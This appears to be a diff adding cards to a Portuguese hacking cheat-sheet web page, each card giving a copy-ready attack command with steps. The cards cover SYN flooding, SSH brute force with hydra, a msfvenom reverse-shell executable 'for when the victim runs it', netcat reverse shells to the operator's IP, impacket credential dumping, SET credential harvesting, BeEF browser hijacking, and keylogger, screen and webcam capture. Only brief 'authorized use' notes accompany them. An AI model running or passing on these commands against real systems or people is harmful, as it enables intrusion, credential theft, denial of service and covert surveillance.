-<div class='card' data-cat='Ataques Web'><h3>dirb - Scanner de diretórios web</h3><div class='tags'><span>dirb</span><span>diretorios</span><span>scanner</span></div><div class='cmd-wrap'><code class='cmd'>dirb http://alvo.com /usr/share/wordlists/dirb/common.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: dirb http://alvo.com &lt;wordlist&gt;</li><li>Encontra diretórios e arquivos escondidos.</li></ol></div></div>
-<div class='card' data-cat='Ataques Web'><h3>whatweb - Identificar tecnologia do site</h3><div class='tags'><span>whatweb</span><span>tecnologia</span><span>cms</span><span>fingerprint</span></div><div class='cmd-wrap'><code class='cmd'>whatweb http://alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: whatweb http://alvo.com</li><li>Mostra CMS, servidor, framework.</li><li>Ótimo para reconhecimento.</li></ol></div></div>
-<div class='card' data-cat='Ataques Web'><h3>hping3 - Flood de pacotes</h3><div class='tags'><span>ddos</span><span>flood</span><span>hping3</span><span>pacotes</span></div><div class='cmd-wrap'><code class='cmd'>sudo hping3 --flood -p 80 -S alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Escolha alvo e porta.</li><li>Rode: sudo hping3 --flood -p 80 -S alvo.com</li><li>--flood envia o máximo; -S flag SYN.</li><li>APENAS em servidores próprios. DDoS é crime.</li></ol></div></div>
-<div class='card' data-cat='Senhas'><h3>hydra - Força bruta em logins</h3><div class='tags'><span>hydra</span><span>forca bruta</span><span>quebrar senha</span><span>ssh</span><span>ftp</span><span>login</span></div><div class='cmd-wrap'><code class='cmd'>hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.10</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Tenha listas de usuários (-L) e senhas (-P).</li><li>Rode: hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.10</li><li>Escolha o protocolo: ssh, ftp, rdp, smb...</li><li>Veja o par usuário:senha encontrado.</li></ol></div></div>
-<div class='card' data-cat='Senhas'><h3>john - Quebrar hash de senha</h3><div class='tags'><span>john</span><span>crackear hash</span><span>rockyou</span></div><div class='cmd-wrap'><code class='cmd'>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Coloque o hash em hash.txt.</li><li>Rode: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</li><li>Aguarde.</li><li>Veja: john --show hash.txt</li></ol></div></div>
-<div class='card' data-cat='Senhas'><h3>hashcat - Quebrar hash com GPU/CPU</h3><div class='tags'><span>hashcat</span><span>crack</span><span>gpu</span><span>modo</span></div><div class='cmd-wrap'><code class='cmd'>hashcat -m 0 -a 0 hash.txt rockyou.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Descubra o modo (-m). MD5=0, SHA1=100, NTLM=1000.</li><li>Rode: hashcat -m 0 -a 0 hash.txt rockyou.txt</li><li>-a 0 = dicionário, -a 3 = bruto.</li><li>Veja a senha encontrada.</li></ol></div></div>
-<div class='card' data-cat='Senhas'><h3>cewl - Gerar wordlist de um site</h3><div class='tags'><span>cewl</span><span>wordlist site</span><span>gerar senha</span></div><div class='cmd-wrap'><code class='cmd'>cewl http://alvo.com -w wordlist.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: cewl http://alvo.com -w wordlist.txt</li><li>Extrai palavras do site.</li><li>Use -d (profundidade) e -m (tamanho mínimo).</li><li>Gera wordlist personalizada.</li></ol></div></div>
-<div class='card' data-cat='Senhas'><h3>crunch - Gerar wordlist por combinações</h3><div class='tags'><span>crunch</span><span>wordlist</span><span>combinacoes</span></div><div class='cmd-wrap'><code class='cmd'>crunch 6 8 abc123 -o wordlist.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: crunch 6 8 abc123 -o wordlist.txt</li><li>6-8 = tamanho mínimo-máximo; abc123 = charset.</li><li>Gera todas as combinações possíveis.</li></ol></div></div>
-<div class='card' data-cat='Exploração'><h3>Metasploit - Buscar e usar exploits</h3><div class='tags'><span>metasploit</span><span>exploit</span><span>msfconsole</span></div><div class='cmd-wrap'><code class='cmd'>msfconsole</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Entre: msfconsole</li><li>Busque: search nome</li><li>Use: use exploit/...</li><li>Configure: set RHOSTS, set LHOST</li><li>Rode: run</li><li>Sessão: sessions -i 1.</li></ol></div></div>
-<div class='card' data-cat='Exploração'><h3>msfvenom - Gerar payload</h3><div class='tags'><span>msfvenom</span><span>payload</span><span>shell reverso</span><span>meterpreter</span></div><div class='cmd-wrap'><code class='cmd'>msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe &gt; shell.exe</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Substitua SEU_IP pelo seu IP.</li><li>Rode o comando msfvenom.</li><li>No Metasploit: use multi/handler, set payload, LHOST, LPORT.</li><li>Quando a vítima rodar, você pega a sessão.</li><li>Somente em teste autorizado.</li></ol></div></div>
-<div class='card' data-cat='Exploração'><h3>netcat (nc) - Portas e shell reverso</h3><div class='tags'><span>netcat</span><span>nc</span><span>shell reverso</span><span>porta</span></div><div class='cmd-wrap'><code class='cmd'>nc -lvnp 4444   # ouvir
-nc alvo.com 4444   # conectar</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Ouvir: nc -lvnp 4444</li><li>Conectar: nc alvo.com 4444</li><li>Shell no alvo: nc SEU_IP 4444 -e /bin/sh</li><li>Transferir: nc alvo 4444 &lt; arquivo</li></ol></div></div>
-<div class='card' data-cat='Enumeração'><h3>enum4linux - Enumerar SMB/Windows</h3><div class='tags'><span>enum4linux</span><span>smb</span><span>windows</span><span>compartilhamento</span></div><div class='cmd-wrap'><code class='cmd'>enum4linux -a 192.168.1.10</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: enum4linux -a 192.168.1.10</li><li>Coleta usuários, compartilhamentos, políticas.</li><li>Uso autorizado.</li></ol></div></div>
-<div class='card' data-cat='Enumeração'><h3>dnsenum - Enumerar DNS</h3><div class='tags'><span>dnsenum</span><span>dns</span><span>subdominio</span></div><div class='cmd-wrap'><code class='cmd'>dnsenum alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: dnsenum alvo.com</li><li>Coleta subdomínios e servidores DNS.</li></ol></div></div>
-<div class='card' data-cat='Enumeração'><h3>whois - Informações de domínio</h3><div class='tags'><span>whois</span><span>dominio</span><span>informacao</span><span>osint</span></div><div class='cmd-wrap'><code class='cmd'>whois alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: whois alvo.com</li><li>Mostra dono, datas, servidores DNS.</li><li>Ótimo para OSINT.</li></ol></div></div>
-<div class='card' data-cat='Anonimato'><h3>tor + proxychains - Navegação anônima</h3><div class='tags'><span>tor</span><span>proxychains</span><span>anonimo</span><span>proxy</span></div><div class='cmd-wrap'><code class='cmd'>tor &amp;
-proxychains curl http://alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: pkg install tor proxychains-ng -y</li><li>Inicie o Tor: tor &amp;</li><li>Use: proxychains curl http://alvo.com</li><li>O tráfego passa pela rede Tor.</li></ol></div></div>
-<div class='card' data-cat='Forense'><h3>foremost - Recuperar arquivos</h3><div class='tags'><span>foremost</span><span>recuperar arquivos</span><span>apagados</span></div><div class='cmd-wrap'><code class='cmd'>foremost -i imagem.dd -o saida/</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: foremost -i imagem.dd -o saida/</li><li>Recupera arquivos apagados de imagem de disco.</li></ol></div></div>
-<div class='card' data-cat='Criptografia'><h3>openssl - Criptografar arquivo (AES-256)</h3><div class='tags'><span>openssl</span><span>criptografar</span><span>aes</span><span>arquivo</span></div><div class='cmd-wrap'><code class='cmd'>openssl enc -aes-256-cbc -salt -in arquivo.txt -out arquivo.enc</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode o comando openssl enc.</li><li>Digite a senha.</li><li>Para voltar: openssl enc -d -aes-256-cbc -in arquivo.enc -out arquivo.txt</li><li>Guarde a senha.</li></ol></div></div>
-<div class='card' data-cat='Criptografia'><h3>openssl - Gerar hash de arquivo</h3><div class='tags'><span>openssl</span><span>hash</span><span>sha256</span><span>checksum</span></div><div class='cmd-wrap'><code class='cmd'>openssl dgst -sha256 arquivo.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: openssl dgst -sha256 arquivo.txt</li><li>Mostra o hash SHA-256.</li><li>Use para verificar integridade.</li></ol></div></div>
-<div class='card' data-cat='Criptografia'><h3>gpg - Criptografar e assinar</h3><div class='tags'><span>gpg</span><span>criptografar</span><span>chave</span><span>assinar</span></div><div class='cmd-wrap'><code class='cmd'>gpg --full-generate-key
-gpg --encrypt --recipient email@ex.com arquivo.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Gere chaves: gpg --full-generate-key</li><li>Criptografe: gpg --encrypt --recipient email@ex.com arquivo.txt</li><li>Assine: gpg --sign arquivo.txt</li><li>Descriptografe: gpg --decrypt arquivo.gpg</li></ol></div></div>
-<div class='card' data-cat='Análise de Malware'><h3>ClamAV - Escanear arquivos por vírus</h3><div class='tags'><span>clamav</span><span>antivirus</span><span>escanear</span><span>virus</span></div><div class='cmd-wrap'><code class='cmd'>sudo freshclam
-sudo clamscan -r /caminho</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Atualize: sudo freshclam</li><li>Escanear: sudo clamscan -r /caminho</li><li>Use --infected para só infectados.</li><li>Veja o relatório.</li></ol></div></div>
-<div class='card' data-cat='Análise de Malware'><h3>yara - Detectar malware com regras</h3><div class='tags'><span>yara</span><span>regra</span><span>detectar</span></div><div class='cmd-wrap'><code class='cmd'>yara regra.yar arquivo_suspeito</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Crie o arquivo regra.yar.</li><li>Rode: yara regra.yar arquivo_suspeito</li><li>Se detectar, imprime nome+arquivo.</li><li>Use -r para pastas.</li></ol></div></div>
-<div class='card' data-cat='Análise de Malware'><h3>strings - Extrair textos de um binário</h3><div class='tags'><span>strings</span><span>binario</span><span>texto</span><span>analisar</span></div><div class='cmd-wrap'><code class='cmd'>strings arquivo_suspeito.exe | less</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: strings arquivo_suspeito.exe</li><li>Pagine com | less.</li><li>Procure URLs, caminhos, comandos.</li></ol></div></div>
-<div class='card' data-cat='Análise de Malware'><h3>binwalk - Analisar arquivo binário</h3><div class='tags'><span>binwalk</span><span>firmware</span><span>analisar</span></div><div class='cmd-wrap'><code class='cmd'>binwalk -e arquivo.bin</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: binwalk -e arquivo.bin</li><li>Analisa e extrai conteúdo embutido.</li></ol></div></div>
-<div class='card' data-cat='Pen-testing (Python)'><h3>impacket - Pentest em Windows/AD</h3><div class='tags'><span>impacket</span><span>smb</span><span>psexec</span><span>secretsdump</span></div><div class='cmd-wrap'><code class='cmd'>impacket-psexec usr:pass@10.0.0.1
-impacket-secretsdump usr:pass@10.0.0.1</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>impacket-psexec user:senha@IP — shell remoto via SMB.</li><li>impacket-secretsdump user:senha@IP — extrair hashes.</li><li>Outros: wmiexec, GetUserSPNs, mssqlclient.</li><li>Somente em ambiente autorizado.</li></ol></div></div>
-<div class='card' data-cat='Pen-testing (Python)'><h3>pwntools - Lib Python de exploit/CTF</h3><div class='tags'><span>pwntools</span><span>exploit</span><span>ctf</span><span>binario</span></div><div class='cmd-wrap'><code class='cmd'>python3 -c &quot;from pwn import *; r=remote(&#x27;host&#x27;,1337); r.interactive()&quot;</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: pip install pwntools</li><li>Conecte: from pwn import *; r=remote(&#x27;host&#x27;,porta)</li><li>Envie: r.sendline(...); r.interactive()</li><li>Use cyclic() para achar offsets em CTF.</li></ol></div></div>
-<div class='card' data-cat='IA Local'><h3>ollama - Rodar IA localmente</h3><div class='tags'><span>ollama</span><span>ia</span><span>local</span><span>qwen</span><span>modelo</span></div><div class='cmd-wrap'><code class='cmd'>curl -fsSL https://ollama.com/install.sh | sh
-ollama pull qwen2.5-coder:1.5b
-ollama run qwen2.5-coder:1.5b</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: curl -fsSL https://ollama.com/install.sh | sh</li><li>Baixe modelo: ollama pull qwen2.5-coder:1.5b</li><li>Rode: ollama run qwen2.5-coder:1.5b</li><li>Converse com a IA no terminal, sem internet.</li><li>Outros modelos: llama3.2, phi3, mistral.</li></ol></div></div>
-<div class='card' data-cat='Bloqueio/Defesa'><h3>ufw - Firewall simples</h3><div class='tags'><span>ufw</span><span>firewall</span><span>bloquear porta</span></div><div class='cmd-wrap'><code class='cmd'>sudo ufw enable
-sudo ufw allow 22
-sudo ufw deny 23</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Ative: sudo ufw enable</li><li>Libere: sudo ufw allow 22</li><li>Bloqueie: sudo ufw deny 23</li><li>Veja: sudo ufw status verbose</li></ol></div></div>
-<div class='card' data-cat='Bloqueio/Defesa'><h3>iptables - Bloquear um IP</h3><div class='tags'><span>iptables</span><span>bloquear ip</span><span>regra</span></div><div class='cmd-wrap'><code class='cmd'>sudo iptables -A INPUT -s 1.2.3.4 -j DROP</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Troque 1.2.3.4 pelo IP a bloquear.</li><li>Rode o comando iptables.</li><li>Liste: sudo iptables -L -n</li><li>Remova com -D.</li></ol></div></div>
-<div class='card' data-cat='Bloqueio/Defesa'><h3>netstat - Ver conexões ativas</h3><div class='tags'><span>netstat</span><span>conexoes</span><span>portas</span><span>monitor</span></div><div class='cmd-wrap'><code class='cmd'>netstat -tunap</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: netstat -tunap</li><li>-t TCP, -u UDP, -n sem DNS, -a todas, -p processo.</li><li>Procure conexões suspeitas.</li><li>Ótimo para detectar intrusão.</li></ol></div></div>
-<div class='card' data-cat='Bloqueio/Defesa'><h3>lynis - Auditoria de segurança</h3><div class='tags'><span>lynis</span><span>auditoria</span><span>seguranca</span></div><div class='cmd-wrap'><code class='cmd'>sudo lynis audit system</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo lynis audit system</li><li>Testa dezenas de controles.</li><li>Mostra pontuação e correções.</li><li>Relatório em /var/log/lynis.log</li></ol></div></div>
-<div class='card' data-cat='Bloqueio/Defesa'><h3>chkrootkit - Detectar rootkits</h3><div class='tags'><span>chkrootkit</span><span>rootkit</span><span>detectar</span></div><div class='cmd-wrap'><code class='cmd'>sudo chkrootkit</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo chkrootkit</li><li>Varre por rootkits.</li><li>Se achar, isole o dispositivo.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>Tool-X - Instalar ferramentas de hacking</h3><div class='tags'><span>tool-x</span><span>instalar ferramentas</span><span>installer</span></div><div class='cmd-wrap'><code class='cmd'>git clone https://github.com/rajkumardusad/Tool-X.git
-cd Tool-X
-chmod +x install
-./install</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Clone: git clone .../Tool-X.git</li><li>Entre: cd Tool-X</li><li>Permissão: chmod +x install</li><li>Rode: ./install</li><li>Escolha a ferramenta no menu.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>CyberPhish.py - Phishing (só educativo)</h3><div class='tags'><span>cyberphish</span><span>phishing</span><span>pagina login</span></div><div class='cmd-wrap'><code class='cmd'>python3 CyberPhish.py</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Tenha o script CyberPhish.py na pasta.</li><li>Rode: python3 CyberPhish.py</li><li>Escolha a página a clonar.</li><li>APENAS em laboratório. Phishing é crime.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>Bettercap - Man-in-the-middle</h3><div class='tags'><span>bettercap</span><span>mitm</span><span>arp</span><span>interceptar</span></div><div class='cmd-wrap'><code class='cmd'>sudo bettercap -iface wlan0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo bettercap -iface wlan0</li><li>Use ARP spoofing e sniffing.</li><li>Somente em rede própria/autoriada.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>macchanger - Trocar endereço MAC</h3><div class='tags'><span>macchanger</span><span>mac</span><span>spoofar</span></div><div class='cmd-wrap'><code class='cmd'>sudo macchanger -r wlan0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo macchanger -r wlan0</li><li>Troca o MAC aleatoriamente.</li><li>Use para anonimato/testes.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>sherlock - Buscar usuário em redes sociais</h3><div class='tags'><span>sherlock</span><span>redes sociais</span><span>usuario</span></div><div class='cmd-wrap'><code class='cmd'>sherlock nomedousuario</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sherlock nomedousuario</li><li>Verifica dezenas de redes sociais.</li><li>Mostra onde o nome existe.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>shodan - Buscar dispositivos na internet</h3><div class='tags'><span>shodan</span><span>buscar servidores</span><span>internet</span></div><div class='cmd-wrap'><code class='cmd'>shodan init SUA_API_KEY
-shodan search apache country:BR</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Inicie com API key: shodan init SUA_API_KEY</li><li>Busque: shodan search apache country:BR</li><li>Use filtros: country, port, os, product.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>findomain - Descobrir subdomínios</h3><div class='tags'><span>findomain</span><span>subdominio</span><span>descobrir</span></div><div class='cmd-wrap'><code class='cmd'>findomain -t alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: findomain -t alvo.com</li><li>Descobre subdomínios por várias fontes.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>recon-ng - Framework de OSINT</h3><div class='tags'><span>recon-ng</span><span>osint</span><span>framework</span></div><div class='cmd-wrap'><code class='cmd'>recon-ng</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: recon-ng</li><li>Use marketplaceto / modules search.</li><li>Carregue módulos de coleta.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>tshark - Wireshark no terminal</h3><div class='tags'><span>tshark</span><span>wireshark</span><span>pcap</span></div><div class='cmd-wrap'><code class='cmd'>tshark -i wlan0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: tshark -i wlan0</li><li>Captura e analisa pacotes no terminal.</li><li>Use -r arquivo.pcap para ler arquivo.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>Keylogger - Capturar teclas (educativo)</h3><div class='tags'><span>keylogger</span><span>teclas</span><span>capturar</span></div><div class='cmd-wrap'><code class='cmd'>xinput test-xi2 --root | tee keylog.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode o comando.</li><li>Captura teclas do ambiente X.</li><li>Use só no seu dispositivo/lab.</li><li>Espionar terceiros é crime.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>wfuzz - Fuzzing web</h3><div class='tags'><span>wfuzz</span><span>fuzzing</span><span>parametro</span></div><div class='cmd-wrap'><code class='cmd'>wfuzz -w wordlist.txt http://alvo.com/FUZZ</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: wfuzz -w wordlist.txt http://alvo.com/FUZZ</li><li>Testa diretórios/parâmetros.</li><li>Uso autorizado.</li></ol></div></div>
-<div class='card' data-cat='Mais Ferramentas'><h3>slowloris - Esgotar conexões</h3><div class='tags'><span>slowloris</span><span>ddos</span><span>conexoes</span></div><div class='cmd-wrap'><code class='cmd'>slowloris -v -n 5000 -t 100 alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: slowloris -v -n 5000 -t 100 alvo.com</li><li>Abre conexões lentas.</li><li>Somente em teste autorizado.</li></ol></div></div>
-<div class='card' data-cat='Engenharia Social'><h3>Social-Engineer Toolkit (SET) - Phishing</h3><div class='tags'><span>set</span><span>social engineering</span><span>phishing</span><span>clonar site</span></div><div class='cmd-wrap'><code class='cmd'>sudo setoolkit</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install set -y (ou já vem no Kali).</li><li>Rode: sudo setoolkit</li><li>Escolha 1 (Social-Engineering Attacks) e depois Website Attack Vectors.</li><li>Selecione Credential Harvester Attack Method e clone um site.</li><li>A vítima acessa o site falso e insere credenciais — só em laboratório autorizado.</li><li>Somente em redes/próprios ou autorizados. Phishing é crime.</li></ol></div></div>
-<div class='card' data-cat='Engenharia Social'><h3>BeEF - Framework de ataque ao navegador</h3><div class='tags'><span>beef</span><span>xss framework</span><span>browser</span></div><div class='cmd-wrap'><code class='cmd'>sudo beef-xss</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo beef-xss</li><li>Abra o painel no navegador (URL e senha exibidas).</li><li>Peça à vítima para acessar o hook.js injetado numa página.</li><li>Controle o navegador da vítima (módulos de ataque).</li><li>Somente em ambiente autorizado/lab.</li></ol></div></div>
-<div class='card' data-cat='Engenharia Social'><h3>GoPhish - Campanha de phishing (educativo)</h3><div class='tags'><span>gophish</span><span>campanha phishing</span><span>email</span></div><div class='cmd-wrap'><code class='cmd'>gophish</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: apt install gophish ou baixe do github.</li><li>Rode: gophish</li><li>Acesse https://localhost:3333 (usuário/senha exibidos).</li><li>Crie landing page, e-mail e grupo para a campanha.</li><li>Use para treinamento de conscientização — não contra pessoas reais.</li></ol></div></div>
-<div class='card' data-cat='Spyware / Espionagem'><h3>Xinput Keylogger - Capturar teclas (X11)</h3><div class='tags'><span>keylogger</span><span>capturar teclas</span><span>xinput</span></div><div class='cmd-wrap'><code class='cmd'>xinput test-xi2 --root | tee /tmp/keylog.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode o comando para capturar as teclas do ambiente gráfico X.</li><li>As teclas vão para /tmp/keylog.txt.</li><li>Use apenas no seu próprio dispositivo/laboratório.</li><li>Espiar terceiros é crime (art. 154-A CP).</li></ol></div></div>
-<div class='card' data-cat='Spyware / Espionagem'><h3>scrot - Capturar tela</h3><div class='tags'><span>screen capture</span><span>tirar screenshot</span><span>scrot</span></div><div class='cmd-wrap'><code class='cmd'>scrot /tmp/screen.png</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: apt install scrot -y</li><li>Rode: scrot /tmp/screen.png para capturar a tela.</li><li>Use scrot -d 5 para capturar após 5s (timer).</li><li>Use em seus próprios dispositivos.</li></ol></div></div>
-<div class='card' data-cat='Spyware / Espionagem'><h3>fswebcam - Capturar imagem da webcam</h3><div class='tags'><span>webcam</span><span>camera</span><span>capturar imagem</span></div><div class='cmd-wrap'><code class='cmd'>fswebcam /tmp/foto.jpg</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install fswebcam</li><li>Rode: fswebcam /tmp/foto.jpg</li><li>Especifique device: fswebcam -d /dev/video0 foto.jpg</li><li>Use apenas em equipamentos próprios.</li></ol></div></div>
-<div class='card' data-cat='Rede Avançada'><h3>netcat (nc) - Ouvir portas e transferir</h3><div class='tags'><span>netcat</span><span>nc</span><span>porta</span><span>shell</span></div><div class='cmd-wrap'><code class='cmd'>nc -lvnp 4444   # ouvir
-nc alvo.com 4444   # conectar</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Ouvir: nc -lvnp 4444</li><li>Conectar: nc alvo.com 4444</li><li>Shell remoto: nc SEU_IP 4444 -e /bin/sh</li><li>Transferir: nc alvo 4444 &lt; arquivo</li></ol></div></div>
-<div class='card' data-cat='Rede Avançada'><h3>ncat - Netcat com criptografia</h3><div class='tags'><span>ncat</span><span>nc alternativo</span><span>criptografado</span></div><div class='cmd-wrap'><code class='cmd'>ncat --ssl -l -p 4444</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install ncat</li><li>Ouvir com SSL: ncat --ssl -l -p 4444</li><li>Conectar: ncat --ssl alvo.com 4444</li><li>Útil para canal criptografado em teste autorizado.</li></ol></div></div>
-<div class='card' data-cat='Rede Avançada'><h3>responder - Capturar hashes NTLM na rede</h3><div class='tags'><span>responder</span><span>llmnr</span><span>ntlm</span><span>hash capture</span></div><div class='cmd-wrap'><code class='cmd'>sudo responder -I eth0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo responder -I eth0 (na interface da rede).</li><li>Ele responde a consultas LLMNR/NBT-NS e captura hashes NTLM.</li><li>Use com hashcat/john para quebrar o hash.</li><li>Somente em rede própria/autoriada.</li></ol></div></div>
